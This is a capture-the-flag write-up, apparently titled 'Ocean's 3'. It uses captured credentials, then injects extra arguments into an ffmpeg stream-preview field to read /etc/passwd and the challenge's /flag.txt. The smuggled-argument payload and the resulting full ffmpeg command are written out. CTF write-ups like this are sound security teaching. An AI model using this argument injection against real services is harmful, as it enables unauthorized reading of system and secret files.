# Ocean's 3

By analyzing what the server sent us, we can see it tries to authenticate with the following credentials:
![Credentials in Wireshark](image.png)

For this to happen, we must set up some dummy authentication on our GStreamer server. The following Gist gives an example: https://gist.github.com/half2me/dfa35245016a2e0f1fe969bd490d1187

The credentials are: `admin:llRmyRgmshM`

By using these credentials on the main page, we unlock yet another option, allowing us to preview any stream.

If we input some random values, the following message will display:
`Error running command ffmpeg -y -nostats -loglevel 0 -rtsp_transport tcp -i rtsp://aaasjjweh -s 300x200 -f image2 -frames:v 1 /tmp/tmp3mamfxjz.jpg`

If we try regular command escaping, it does not work. However, if we use spaces it seems to split the arguments correctly.

Recall that the goal of the challenge is to get `/flag.txt` from the server. If we play around with `ffmpeg` locally for the ability to copy files, we can find that there is a special format called `data` which only forwards data. This is useful because an `XLSX` isn't a media file. Also, by using the `-map` option, it's possible to trash the RTSP input completely and only extract the desired file.
In short: `ffmpeg -f data -i /etc/passwd -map 0:0 ./foo.txt`
Payload: `operator:dQw4w9WgXcQ@127.0.0.1/slots.rtsp -f data -i /etc/passwd -map 1:0`
Final command: `ffmpeg -y -nostats -loglevel 0 -rtsp_transport tcp -i rtsp://operator:dQw4w9WgXcQ@127.0.0.1/slots.rtsp -f data -i /etc/passwd -map 1:0 -s 300x200 -f image2 -frames:v 1 /tmp/tmp3mamfxjz.jpg`

This will open the RTSP stream as stream 0, `/etc/passwd` as stream 1 and map the first stream to the 0th output stream.
Testing this, we can see that it seems to work:
![Exfiltration of /etc/passwd](passwd.png)

By changing the path to the desired path, we can extract our `/flag.txt`:
![Flag.txt exfiltration](flag.png)